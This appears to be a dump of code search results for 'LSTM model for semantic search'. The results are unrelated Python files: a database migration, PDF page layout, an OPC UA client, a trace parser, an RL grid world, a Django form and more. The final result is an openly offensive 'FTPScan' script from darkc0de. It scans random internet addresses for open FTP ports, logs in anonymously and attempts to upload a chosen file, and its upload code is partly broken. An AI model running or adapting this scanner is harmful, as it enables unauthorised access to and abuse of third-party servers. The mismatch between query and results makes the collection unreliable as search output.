Query: LSTM model for semantic search

************************** NEXT RESULT **************************************
"""empty message

Revision ID: 47de1903b00
Revises: 15c488d628b
Create Date: 2015-10-01 13:29:56.074228

"""

# revision identifiers, used by Alembic.
revision = '47de1903b00'
down_revision = '15c488d628b'

# add this here in order to use revision with branch_label
branch_labels = None

from alembic import op
import sqlalchemy as sa


def upgrade():
    ### commands auto generated by Alembic - please adjust! ###
    op.drop_column('objects', 'title')
    ### end Alembic commands ###


def downgrade():
    ### commands auto generated by Alembic - please adjust! ###
    op.add_column('objects', sa.Column('title', sa.VARCHAR(length=255), autoincrement=False, nullable=False))
    ### end Alembic commands ###

Query: LSTM model for semantic search

************************** NEXT RESULT **************************************
# This file is part of the qpageview package.
#
# Copyright (c) 2010 - 2016 by Wilbert Berendsen
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
# See http://www.gnu.org/licenses/ for more information.


"""
Manages and positions a group of Page instances.
"""


import copy

from PyQt5.QtCore import QPoint, QPointF, QRect, QSize

from .constants import (
    FixedScale,
    FitWidth,
    FitHeight,
    FitBoth,

    Rotate_0,
    Rotate_90,
    Rotate_180,
    Rotate_270,

    Horizontal,
    Vertical,
)


class AbstractPageLayout(list):
    """Manages page.Page instances with a list-like api.

    You can iterate over the layout itself, which yields all Page instances.

    The following instance attributes are used, with these defaults:

        margin = 4
        spacing = 8
        zoomFactor = 1.0
        dpiX = 72.0
        dpiY = 72.0
        rotation = Rotate_0
        width = 0
        height = 0

    After having changes pages or layout attributes, call update() to update
    the layout.

    """

    margin = 4
    spacing = 8
    zoomFactor = 1.0
    dpiX = 72.0
    dpiY = 72.0
    rotation = Rotate_0
    width = 0
    height = 0

    def __bool__(self):
        """Always return True."""
        return True

    def count(self):
        """Return the number of Page instances."""
        return len(self)

    def empty(self):
        """Return True if there are zero pages."""
        return len(self) == 0

    def copy(self):
        """Return a copy of this layout with copies of all the pages."""
        layout = copy.copy(self)
        layout[:] = (p.copy() for p in self)
        return layout

    def setSize(self, size):
        """Set our size. Normally done after layout by computeSize()."""
        self.width = size.width()
        self.height = size.height()

    def size(self):
        """Return our size as QSize()."""
        return QSize(self.width, self.height)

    def pageAt(self, point):
        """Return the page that contains the given QPoint."""
        # Specific layouts may use faster algorithms to find the page.
        for page in self:
            if page.rect().contains(point):
                return page

    def pagesAt(self, r):
        """Yield the pages touched by the given QRect or QRegion."""
        # Specific layouts may use faster algorithms to find the pages.
        for page in self:
            if r.intersects(page.rect()):
                yield page

    def widestPage(self):
        """Return the widest page, if any.

        Uses the page's natural width and its scale in X-direction.

        """
        if self.count():
            def key(page):
                psize = page.pageSize()
                if (page.rotation + self.rotation) & 1:
                    return psize.height() * page.scaleY
                else:
                    return psize.width() * page.scaleX
            return max(self, key=key)

    def highestPage(self):
        """Return the highest page, if any.

        Uses the page's natural height and its scale in Y-direction.

        """
        if self.count():
            def key(page):
                psize = page.pageSize()
                if (page.rotation + self.rotation) & 1:
                    return psize.width() * page.scaleX
                else:
                    return psize.height() * page.scaleY
            return max(self, key=key)

    def fit(self, size, mode):
        """Fits the layout in the given size (QSize) and ViewMode."""
        if mode and self.count():
            zoomfactors = []
            if mode & FitWidth:
                zoomfactors.append(self.zoomFitWidth(size.width()))
            if mode & FitHeight:
                zoomfactors.append(self.zoomFitHeight(size.height()))
            self.zoomFactor = min(zoomfactors)

    def zoomFitWidth(self, width):
        """Return the zoom factor this layout would need to fit in the width.

        This method is called by fit(). The default implementation returns a
        suitable zoom factor for the widest Page.

        """
        return self.widestPage().zoomForWidth(self, width - self.margin * 2)

    def zoomFitHeight(self, height):
        """Return the zoom factor this layout would need to fit in the height.

        This method is called by fit(). The default implementation returns a
        suitable zoom factor for the highest Page.

        """
        return self.highestPage().zoomForHeight(self, height - self.margin * 2)

    def update(self):
        """Compute the size of all pages and updates their positions.
        Finally set our own size.

        You should call this after having added or deleted pages or after
        having changed the scale, dpi, zoom factor, spacing or margins.

        This function returns True if the total size has changed.

        """
        self.updatePageSizes()
        self.updatePagePositions()
        return self.computeSize()

    def updatePageSizes(self):
        """Compute the correct size of every Page."""
        for page in self:
            page.updateSizeFromLayout(self)

    def updatePagePositions(self):
        """Determine the position of every Page.

        You should implement this method to perform a meaningful layout, which
        means setting the position of all the pages. This positions should
        respect the margin (and preferably also the spacing).

        """
        top = self.margin
        for page in self:
            page.x = self.margin
            page.y = top
            top += page.height
            top += self.spacing

    def computeSize(self):
        """Compute and set the total size of the layout.

        In most cases the implementation of this method is sufficient: it
        computes the bounding rectangle of all Pages and adds the margin.

        True is returned if the total size has changed.

        """
        r = QRect()
        for page in self:
            r |= page.rect()
        m = self.margin
        size = r.adjusted(-m, -m, m, m).size()
        changed = self.size() != size
        self.setSize(size)
        return changed



class PageLayout(AbstractPageLayout):
    """A basic layout that shows pages from right to left or top to bottom.

    Additional instance attribute:

        `orientation`: Horizontal or Vertical (default)

    """
    orientation = Vertical

    def updatePagePositions(self):
        """Order our pages."""
        if self.orientation == Vertical:
            width = max((p.width for p in self), default=0) + self.margin * 2
            top = self.margin
            for page in self:
                page.x = (width - page.width) / 2
                page.y = top
                top += page.height + self.spacing
        else:
            height = max((p.height for p in self), default=0) + self.margin * 2
            left = self.margin
            for page in self:
                page.x = left
                page.y = (height - page.height) / 2
                left += page.width + self.spacing


class RowPageLayout(AbstractPageLayout):
    """A layout that orders pages in rows.

    Additional instance attributes:

        `pagesPerRow`     = 2, the number of pages to display in a row
        `pagesFirstRow`   = 1, the number of pages to display in the first row
        `fitAllColumns`   = True, whether "fit width" uses all columns

    """

    pagesPerRow = 2
    pagesFirstRow = 1
    fitAllColumns = True

    def zoomFitWidth(self, width):
        """Reimplemented to respect the fitAllColumns setting."""
        width -= self.margin * 2
        if self.fitAllColumns:
            ncols = min(self.pagesPerRow, self.count())
            width = (width - self.spacing * (ncols - 1)) // ncols
        return self.widestPage().zoomForWidth(self, width)

    def updatePagePositions(self):
        """Reimplemented to perform our positioning algorithm."""
        pages = list(self)
        cols = self.pagesPerRow
        if len(pages) > cols:
            ## prepend empty places if the first row should display less pages
            pages[0:0] = [None] * ((cols - self.pagesFirstRow) % cols)
        else:
            cols = len(pages)

        col_widths = []
        col_offsets = []
        offset = self.margin
        for col in range(cols):
            width = max(p.width for p in pages[col::cols] if p)
            col_widths.append(width)
            col_offsets.append(offset)
            offset += width + self.spacing

        top = self.margin
        for row in (pages[i:i + cols] for i in range(0, len(pages), cols or 1)):
            height = max(p.height for p in row if p)
            for n, page in enumerate(row):
                if page:
                    page.x = col_offsets[n] + (col_widths[n] - page.width) // 2
                    page.y = top + (height - page.height) // 2
            top += height + self.spacing



Query: LSTM model for semantic search

************************** NEXT RESULT **************************************
import sys
sys.path.insert(0, "..")

try:
    from IPython import embed
except ImportError:
    import code

    def embed():
        vars = globals()
        vars.update(locals())
        shell = code.InteractiveConsole(vars)
        shell.interact()


from opcua import Client


class SubHandler(object):

    """
    Subscription Handler. To receive events from server for a subscription
    data_change and event methods are called directly from receiving thread.
    Do not do expensive, slow or network operation there. Create another
    thread if you need to do such a thing
    """
    def event_notification(self, event):
        print("New event recived: ", event)


if __name__ == "__main__":

    client = Client("opc.tcp://localhost:4840/freeopcua/server/")
    # client = Client("opc.tcp://admin@localhost:4840/freeopcua/server/") #connect using a user
    try:
        client.connect()

        # Client has a few methods to get proxy to UA nodes that should always be in address space such as Root or Objects
        root = client.get_root_node()
        print("Objects node is: ", root)

        # Now getting a variable node using its browse path
        obj = root.get_child(["0:Objects", "2:MyObject"])
        print("MyObject is: ", obj)

        myevent = root.get_child(["0:Types", "0:EventTypes", "0:BaseEventType", "2:MyFirstEvent"])
        print("MyFirstEventType is: ", myevent)

        msclt = SubHandler()
        sub = client.create_subscription(100, msclt)
        handle = sub.subscribe_events(obj, myevent)

        embed()
        sub.unsubscribe(handle)
        sub.delete()
    finally:
        client.disconnect()

Query: LSTM model for semantic search

************************** NEXT RESULT **************************************
from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

import re
import unittest

"""
#                              _-----=> irqs-off
#                             / _----=> need-resched
#                            | / _---=> hardirq/softirq
#                            || / _--=> preempt-depth
#                            ||| /     delay
#           TASK-PID   CPU#  ||||    TIMESTAMP  FUNCTION
#              | |       |   ||||       |         |
          <idle>-0     [001] ...2  3269.291072: sched_switch: prev_comm=swapper/1 prev_pid=0 prev_prio=120 prev_state=R ==> next_comm=mmcqd/0 next_pid=120 next_prio=120
"""
TRACE_LINE_PATTERN = re.compile(
    r'^\s*(?P<task>.+)-(?P<pid>\d+)\s+(?:\((?P<tgid>.+)\)\s+)?\[(?P<cpu>\d+)\]\s+(?:(?P<flags>\S{4})\s+)?(?P<timestamp>[0-9.]+):\s+(?P<function>.+)$')

"""
Example lines from custom app traces:
0: B|27295|providerRemove
0: E
tracing_mark_write: S|27311|NNFColdStart<D-7744962>|1112249168
"""
APP_TRACE_LINE_PATTERN = re.compile(
    r'^(?P<type>.+?): (?P<args>.+)$')

"""
Example section names:
NNFColdStart
NNFColdStart<0><T7744962>
NNFColdStart<X>
NNFColdStart<T7744962>
"""
DECORATED_SECTION_NAME_PATTERN = re.compile(r'^(?P<section_name>.*?)(?:<0>)?(?:<(?P<command>.)(?P<argument>.*?)>)?$')

SYSTRACE_LINE_TYPES = set(['0', 'tracing_mark_write'])

class TraceLine(object):
    def __init__(self, task, pid, tgid, cpu, flags, timestamp, function):
        self.task = task
        self.pid = pid
        self.tgid = tgid
        self.cpu = cpu
        self.flags = flags
        self.timestamp = timestamp
        self.function = function
        self.canceled = False

    @property
    def is_app_trace_line(self):
        return isinstance(self.function, AppTraceFunction)

    def cancel(self):
        self.canceled = True

    def __str__(self):
        if self.canceled:
            return ""
        elif self.tgid:
            return "{task:>16s}-{pid:<5d} ({tgid:5s}) [{cpu:03d}] {flags:4s} {timestamp:12f}: {function}\n".format(**vars(self))
        elif self.flags:
            return "{task:>16s}-{pid:<5d} [{cpu:03d}] {flags:4s} {timestamp:12f}: {function}\n".format(**vars(self))
        else:
            return "{task:>16s}-{pid:<5d} [{cpu:03d}] {timestamp:12.6f}: {function}\n".format(**vars(self))


class AppTraceFunction(object):
    def __init__(self, type, args):
        self.type = type
        self.args = args
        self.operation = args[0]

        if len(args) >= 2 and args[1]:
            self.pid = int(args[1])
        if len(args) >= 3:
            self._section_name, self.command, self.argument = _parse_section_name(args[2])
            args[2] = self._section_name
        else:
            self._section_name = None
            self.command = None
            self.argument = None
        self.cookie = None

    @property
    def section_name(self):
        return self._section_name

    @section_name.setter
    def section_name(self, value):
        self._section_name = value
        self.args[2] = value

    def __str__(self):
        return "{type}: {args}".format(type=self.type, args='|'.join(self.args))


class AsyncTraceFunction(AppTraceFunction):
    def __init__(self, type, args):
        super(AsyncTraceFunction, self).__init__(type, args)

        self.cookie = int(args[3])


TRACE_TYPE_MAP = {
    'S': AsyncTraceFunction,
    'T': AsyncTraceFunction,
    'F': AsyncTraceFunction,
}

def parse_line(line):
    match = TRACE_LINE_PATTERN.match(line.strip())
    if not match:
        return None

    task = match.group("task")
    pid = int(match.group("pid"))
    tgid = match.group("tgid")
    cpu = int(match.group("cpu"))
    flags = match.group("flags")
    timestamp = float(match.group("timestamp"))
    function = match.group("function")

    app_trace = _parse_function(function)
    if app_trace:
        function = app_trace

    return TraceLine(task, pid, tgid, cpu, flags, timestamp, function)

def parse_dextr_line(line):
    task = line["name"]
    pid = line["pid"]
    tgid = line["tid"]
    cpu = None
    flags = None
    timestamp = line["ts"]
    function = AppTraceFunction("DextrTrace", [line["ph"], line["pid"], line["name"]])

    return TraceLine(task, pid, tgid, cpu, flags, timestamp, function)


def _parse_function(function):
    line_match = APP_TRACE_LINE_PATTERN.match(function)
    if not line_match:
        return None

    type = line_match.group("type")
    if not type in SYSTRACE_LINE_TYPES:
        return None

    args = line_match.group("args").split('|')
    if len(args) == 1 and len(args[0]) == 0:
        args = None

    constructor = TRACE_TYPE_MAP.get(args[0], AppTraceFunction)
    return constructor(type, args)


def _parse_section_name(section_name):
    if section_name is None:
        return section_name, None, None

    section_name_match = DECORATED_SECTION_NAME_PATTERN.match(section_name)
    section_name = section_name_match.group("section_name")
    command = section_name_match.group("command")
    argument = section_name_match.group("argument")
    return section_name, command, argument


def _format_section_name(section_name, command, argument):
    if not command:
        return section_name

    return "{section_name}<{command}{argument}>".format(**vars())


class RoundTripFormattingTests(unittest.TestCase):
    def testPlainSectionName(self):
        section_name = "SectionName12345-5562342fas"

        self.assertEqual(section_name, _format_section_name(*_parse_section_name(section_name)))

    def testDecoratedSectionName(self):
        section_name = "SectionName12345-5562342fas<D-123456>"

        self.assertEqual(section_name, _format_section_name(*_parse_section_name(section_name)))

    def testSimpleFunction(self):
        function = "0: E"

        self.assertEqual(function, str(_parse_function(function)))

    def testFunctionWithoutCookie(self):
        function = "0: B|27295|providerRemove"

        self.assertEqual(function, str(_parse_function(function)))

    def testFunctionWithCookie(self):
        function = "0: S|27311|NNFColdStart|1112249168"

        self.assertEqual(function, str(_parse_function(function)))

    def testFunctionWithCookieAndArgs(self):
        function = "0: T|27311|NNFColdStart|1122|Start"

        self.assertEqual(function, str(_parse_function(function)))

    def testFunctionWithArgsButNoPid(self):
        function = "0: E|||foo=bar"

        self.assertEqual(function, str(_parse_function(function)))

    def testKitKatFunction(self):
        function = "tracing_mark_write: B|14127|Looper.dispatchMessage|arg=>>>>> Dispatching to Handler (android.os.Handler) {422ae980} null: 0|Java"

        self.assertEqual(function, str(_parse_function(function)))

    def testNonSysTraceFunctionIgnored(self):
        function = "sched_switch: prev_comm=swapper/1 prev_pid=0 prev_prio=120 prev_state=R ==> next_comm=mmcqd/0 next_pid=120 next_prio=120"

        self.assertEqual(None, _parse_function(function))

    def testLineWithFlagsAndTGID(self):
        line = "          <idle>-0     (  550) [000] d..2  7953.258473: cpu_idle: state=1 cpu_id=0\n"

        self.assertEqual(line, str(parse_line(line)))

    def testLineWithFlagsAndNoTGID(self):
        line = "          <idle>-0     (-----) [000] d..2  7953.258473: cpu_idle: state=1 cpu_id=0\n"

        self.assertEqual(line, str(parse_line(line)))

    def testLineWithFlags(self):
        line = "          <idle>-0     [001] ...2  3269.291072: sched_switch: prev_comm=swapper/1 prev_pid=0 prev_prio=120 prev_state=R ==> next_comm=mmcqd/0 next_pid=120 next_prio=120\n"

        self.assertEqual(line, str(parse_line(line)))

    def testLineWithoutFlags(self):
        line = "          <idle>-0     [001]  3269.291072: sched_switch: prev_comm=swapper/1 prev_pid=0 prev_prio=120 prev_state=R ==> next_comm=mmcqd/0 next_pid=120 next_prio=120\n"

        self.assertEqual(line, str(parse_line(line)))

Query: LSTM model for semantic search

************************** NEXT RESULT **************************************
# 
# Copyright (C) 2009, Brian Tanner
# 
#http://rl-glue-ext.googlecode.com/
#
# Licensed under the Apache License, Version 2.0 (the "License")
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
#  $Revision: 999 $
#  $Date: 2009-02-09 09:39:12 -0700 (Mon, 09 Feb 2009) $
#  $Author: brian@tannerpages.com $
#  $HeadURL: http://rl-library.googlecode.com/svn/trunk/projects/packages/examples/mines-sarsa-python/sample_mines_environment.py $

import random
import sys
from rlglue.environment.Environment import Environment
from rlglue.environment import EnvironmentLoader as EnvironmentLoader
from rlglue.types import Observation
from rlglue.types import Action
from rlglue.types import Reward_observation_terminal

# This is a very simple discrete-state, episodic grid world that has 
# exploding mines in it.  If the agent steps on a mine, the episode
# ends with a large negative reward.
# 
# The reward per step is -1, with +10 for exiting the game successfully
# and -100 for stepping on a mine.


# TO USE THIS Environment [order doesn't matter]
# NOTE: I'm assuming the Python codec is installed an is in your Python path
#   -  Start the rl_glue executable socket server on your computer
#   -  Run the SampleSarsaAgent and SampleExperiment from this or a
#   different codec (Matlab, Python, Java, C, Lisp should all be fine)
#   -  Start this environment like:
#   $> python sample_mines_environment.py

class mines_environment(Environment):
	WORLD_FREE = 0
	WORLD_OBSTACLE = 1
	WORLD_MINE = 2 
	WORLD_GOAL = 3
	randGenerator=random.Random()
	fixedStartState=False
	startRow=1
	startCol=1
	
	currentState=10
	def env_init(self):
	    
		self.map=[   [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],
		                    [1, 0, 0, 0, 0, 0, 0, 2, 2, 0, 0, 0, 0, 0, 0, 0, 0, 1],
		                    [1, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1],
		                    [1, 0, 0, 0, 0, 0, 0, 0, 0, 2, 2, 2, 0, 0, 0, 0, 1, 1],
		                    [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 1],
		                    [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]]

		#The Python task spec parser is not yet able to build task specs programmatically
		return "VERSION RL-Glue-3.0 PROBLEMTYPE episodic DISCOUNTFACTOR 1 OBSERVATIONS INTS (0 107) ACTIONS INTS (0 3) REWARDS (-100.0 10.0) EXTRA SampleMinesEnvironment(C/C++) by Brian Tanner."
	
	def env_start(self):
		if self.fixedStartState:
			stateValid=self.setAgentState(self.startRow,self.startCol)
			if not stateValid:
				print "The fixed start state was NOT valid: "+str(int(self.startRow))+","+str(int(self.startRow))
				self.setRandomState()
		else:
			self.setRandomState()

		returnObs=Observation()
		returnObs.intArray=[self.calculateFlatState()]

		return returnObs
		
	def env_step(self,thisAction):
		# Make sure the action is valid 
		assert len(thisAction.intArray)==1,"Expected 1 integer action."
		assert thisAction.intArray[0]>=0, "Expected action to be in [0,3]"
		assert thisAction.intArray[0]<4, "Expected action to be in [0,3]"
		
		self.updatePosition(thisAction.intArray[0])

		theObs=Observation()
		theObs.intArray=[self.calculateFlatState()]

		returnRO=Reward_observation_terminal()
		returnRO.r=self.calculateReward()
		returnRO.o=theObs
		returnRO.terminal=self.checkCurrentTerminal()

		return returnRO

	def env_cleanup(self):
		pass

	def env_message(self,inMessage):
		#	Message Description
	 	# 'set-random-start-state'
	 	#Action: Set flag to do random starting states (the default)
		if inMessage.startswith("set-random-start-state"):
			self.fixedStartState=False;
			return "Message understood.  Using random start state.";

		#	Message Description
		# 'set-start-state X Y'
		# Action: Set flag to do fixed starting states (row=X, col=Y)
		if inMessage.startswith("set-start-state"):
			splitString=inMessage.split(" ");
			self.startRow=int(splitString[1]);
			self.startCol=int(splitString[2]);
			self.fixedStartState=True;
			return "Message understood.  Using fixed start state.";

		#	Message Description
		#	'print-state'
		#	Action: Print the map and the current agent location
		if inMessage.startswith("print-state"):
			self.printState();
			return "Message understood.  Printed the state.";

		return "SamplesMinesEnvironment(Python) does not respond to that message.";

	def setAgentState(self,row, col):
		self.agentRow=row
		self.agentCol=col

		return self.checkValid(row,col) and not self.checkTerminal(row,col)

	def setRandomState(self):
		numRows=len(self.map)
		numCols=len(self.map[0])
		startRow=self.randGenerator.randint(0,numRows-1)
		startCol=self.randGenerator.randint(0,numCols-1)

		while not self.setAgentState(startRow,startCol):
			startRow=self.randGenerator.randint(0,numRows-1)
			startCol=self.randGenerator.randint(0,numCols-1)

	def checkValid(self,row, col):
		valid=False
		numRows=len(self.map)
		numCols=len(self.map[0])

		if(row < numRows and row >= 0 and col < numCols and col >= 0):
			if self.map[row][col] != self.WORLD_OBSTACLE:
				valid=True
		return valid

	def checkTerminal(self,row,col):
		if (self.map[row][col] == self.WORLD_GOAL or self.map[row][col] == self.WORLD_MINE):
			return True
		return False

	def checkCurrentTerminal(self):
		return self.checkTerminal(self.agentRow,self.agentCol)

	def calculateFlatState(self):
		numRows=len(self.map)
		return self.agentCol * numRows + self.agentRow



	def updatePosition(self, theAction):
		# When the move would result in hitting an obstacles, the agent simply doesn't move 
		newRow = self.agentRow;
		newCol = self.agentCol;

		if (theAction == 0):#move down
			newCol = self.agentCol - 1;

		if (theAction == 1): #move up
			newCol = self.agentCol + 1;

		if (theAction == 2):#move left
			newRow = self.agentRow - 1;

		if (theAction == 3):#move right
			newRow = self.agentRow + 1;

		#Check if new position is out of bounds or inside an obstacle 
		if(self.checkValid(newRow,newCol)):
			self.agentRow = newRow;
			self.agentCol = newCol;

	def calculateReward(self):
		if(self.map[self.agentRow][self.agentCol] == self.WORLD_GOAL):
			return 10.0;
		if(self.map[self.agentRow][self.agentCol] == self.WORLD_MINE):
			return -100.0;
		return -1.0;
		
	def printState(self):
		numRows=len(self.map)
		numCols=len(self.map[0])
		print "Agent is at: "+str(self.agentRow)+","+str(self.agentCol)
		print "Columns:0-10                10-17"
		print "Col    ",
		for col in range(0,numCols):
			print col%10,
			
		for row in range(0,numRows):
			print
			print "Row: "+str(row)+" ",
			for col in range(0,numCols):
				if self.agentRow==row and self.agentCol==col:
					print "A",
				else:
					if self.map[row][col] == self.WORLD_GOAL:
						print "G",
					if self.map[row][col] == self.WORLD_MINE:
						print "M",
					if self.map[row][col] == self.WORLD_OBSTACLE:
						print "*",
					if self.map[row][col] == self.WORLD_FREE:
						print " ",
		print
		

if __name__=="__main__":
	EnvironmentLoader.loadEnvironment(mines_environment())
Query: LSTM model for semantic search

************************** NEXT RESULT **************************************
#!/usr/bin/env python
from urllib.parse import urljoin
from os.path import join, dirname, exists
from os import makedirs
import yaml, argparse

template = '''<!DOCTYPE html>
<meta charset="utf-8">
<title>Redirecting...</title>
<link rel="canonical" href="{href}">
<meta http-equiv="refresh" content="0; url={href}">
<h1>Redirecting...</h1>
<a href="{href}">Click here if you are not redirected.</a>
<script>location="{href}"</script>
'''

def setup_redirect(old_path, new_href):
    if exists(old_path):
        print('Will not overwrite', old_path)
        return
    
    if not exists(dirname(old_path)):
        makedirs(dirname(old_path))
    
    with open(old_path, 'w') as output:
        output.write(template.format(href=new_href))

    print('Redirecting from', old_path, 'to', new_href)

parser = argparse.ArgumentParser(description='Prepare some redirects.')
parser.add_argument('config', help='Configuration file path')
parser.add_argument('base', help='Output documentation base path')

if __name__ == '__main__':
    args = parser.parse_args()
    
    with open(args.config) as input:
        config = yaml.safe_load(input)
        site_dir = config.get('site_dir')
        
        for (old_name, new_name) in config.get('mz:redirects', {}).items():
            old_path = join(site_dir, old_name, 'index.html')
            new_href = urljoin(args.base, new_name)
            setup_redirect(old_path, new_href)

Query: LSTM model for semantic search

************************** NEXT RESULT **************************************
from django import forms

from doorstep.geo.models import Country, State, Address


class AddressForm(forms.ModelForm):
    """
    Address form for checkout
    """
    class Meta:
        model = Address
        fields = ('first_name', 'last_name', 'email', 'address1', 'address2',
                  'phone_number', 'fax_number', 'zip_or_postal_code', 'city', 'country', 'state', 'company')
        widgets = {
            'first_name': forms.TextInput(attrs=({'placeholder': 'First name...'})),
            'last_name': forms.TextInput(attrs=({'placeholder': 'Last name...'})),
            'email': forms.TextInput(attrs=({'placeholder': 'Email address...'})),
            'phone_number': forms.TextInput(attrs=({'placeholder': 'Phone number...'})),
            'fax_number': forms.TextInput(attrs=({'placeholder': 'Fax number... (Optional)'})),
            'address1': forms.TextInput(attrs=({'placeholder': 'Address line 1...'})),
            'address2': forms.TextInput(attrs=({'placeholder': 'Address line 2... (Optional)'})),
            'zip_or_postal_code': forms.TextInput(attrs=({'placeholder': 'Zip/Postal Code...'})),
            'city': forms.TextInput(attrs=({'placeholder': 'City...'})),
            'country': forms.Select(attrs=({'placeholder': 'Country...'})),
            'company': forms.TextInput(attrs=({'placeholder': 'Company... (Optional)'})),

        }
        error_messages = {
            'first_name': {'required': 'Please enter your first name.'},
            'last_name': {'required': 'Please enter your last name.'},
            'email': {'required': 'Please enter your email address.'},
            'address1': {'required': 'Please enter your address.'},
            'city': {'required': 'Please specify your city.'},
            'zip_or_postal_code': {'required': 'Please enter Zip or Postal Code.'},
            'country': {'required': 'Please specify your country.'},
            'phone_number': {'required': 'Please entery your phone number.'}
        }

    def __init__(self, *args, **kwargs):
        super(AddressForm, self).__init__(*args, **kwargs)
        self.fields['country'].empty_label = None
        self.fields['country'].queryset = Country.objects.filter(is_active=True)

    @classmethod
    def get_countries(cls):
        return list(Country.objects.filter(is_active=True))

    @classmethod
    def get_states(cls):
        return list(State.objects.filter(is_active=True))

Query: LSTM model for semantic search

************************** NEXT RESULT **************************************
import sys
import io
import unittest
#import test_gom
import test_plugin

class IntegrationTest(unittest.TestCase):
	def	test_paths(self):
		print('System path:')
		print(sys.path)

verbosity = 2
runner = unittest.TextTestRunner(verbosity=verbosity)
#runner.run(test_gom.GetSuite())
runner.run(test_plugin.GetSuite())

Query: LSTM model for semantic search

************************** NEXT RESULT **************************************

class AdnError(Exception):
    pass


class AdnAPIException(AdnError):
    def __init__(self, api_response):
        super(AdnAPIException, self).__init__(api_response.meta.error_message)
        self.response = api_response
        self.error_id = api_response.meta.get('error_id')
        self.error_slug = api_response.meta.get('error_slug')

    def __str__(self):
        return "%s error_id: %s error_slug: %s" % (super(AdnAPIException, self).__str__(), self.error_id, self.error_slug)


class AdnBadRequestAPIException(AdnAPIException):
    def __init__(self, response):
        response.meta.error_message = response.meta.error_message.replace('Bad Request: ', '')
        super(AdnBadRequestAPIException, self).__init__(response)


class AdnAuthAPIException(AdnAPIException):
    pass


class AdnRateLimitAPIException(AdnAPIException):
    pass


class AdnInsufficientStorageException(AdnAPIException):
    pass


class AdnPermissionDenied(AdnAPIException):
    pass


class AdnMissing(AdnAPIException):
    pass

Query: LSTM model for semantic search

************************** NEXT RESULT **************************************
#!/usr/bin/python
#Searches random ips for ftp port open then checks
#anonymous login and attempts upload. Uses nmap or 
#sockets and includes threading.

#Changlog v1.1: added threading, checks if uploading allowed, +- nmap option

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import commands, sys, StringIO, re, threading, time, ftplib, random, socket
from ftplib import FTP

def nmapscan():
	
	nmap = StringIO.StringIO(commands.getstatusoutput('nmap -P0 -iR 1 -p 21 | grep -B 3 open')[1]).readlines()

	for tmp in nmap:
		ip = re.findall("\d*\.\d*\.\d*\.\d*", tmp)
		if ip: 
			ipaddr = ip[0]
			ftpcheck(ipaddr)
			
def servscan():
	
	ipaddr = rand()

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(15)
		s.connect((ipaddr, 21))
		s.close()
		ftpcheck(ipaddr)
	except socket.error:
		pass
	
def rand():
	a = random.randrange(255) + 1
	b = random.randrange(255) + 1
	c = random.randrange(255) + 1
	d = random.randrange(255) + 1
	ip = "%d.%d.%d.%d" % (a,b,c,d)
	return ip
							
def ftpcheck(ipaddr):
	
	try:
		print "\n[+] Checking anonymous login:",ipaddr
		ftp = ftplib.FTP(ipaddr)
		print "[+] Response:",ftp.getwelcome()
		ftp.login()
		ftp.retrlines('LIST')
		print "\t[!] Anonymous login successful:",ipaddr
		print "[+] Testing Upload"
		ftp.sendcmd('PUT '+file)
		print "[+] Currect Directory:",ftplib.pwd()
		print "\t[!] Upload successful:",ipaddr
		ftp.quit()
	except (ftplib.all_errors), msg: 
		print "[-] An error occurred:",msg,"\n"
	
#................................................
print "\n   d3hydr8[at]gmail[dot]com FTPScan v1.1"
print "----------------------------------------------\n"

if len(sys.argv) != 3 and len(sys.argv) != 4:
	print "Usage: ./ftprand.py <number of ips to scan> <file to upload>\n"
	print "\t[option]"
	print "\t   -nmap : Uses sockets instead of nmap to find open ports"
	print "\nExample: ./ftprand.py 10000 /home/d3hydr8/test.txt -nmap\n"
	sys.exit(0)

num = int(sys.argv[1])
file = sys.argv[2]
try:
  	open(file, "r")
except(IOError): 
  	print "\n[-] Error: Check your file path\n"
  	sys.exit(1)
print "[+] Scanning:",num
print "[+] Upload File:",file
try:
	if sys.argv[3].lower() == "-nmap":
		print "[+] Socket Scan Mode\n"
		for x in xrange(num):
			print "[-]",x+1,"of",num
			#Change this limit for faster results.
			time.sleep(5)
			threading.Thread(target=servscan).start()
	else:
		print "\n[-] Error: Check your options\n"
		sys.exit(1)
except(IndexError):
	print "[+] Nmap Mode\n"
	for x in xrange(num):
		print "[-]",x+1,"of",num
		#Change this limit for faster results.
		time.sleep(5)
		threading.Thread(target=nmapscan).start()
	
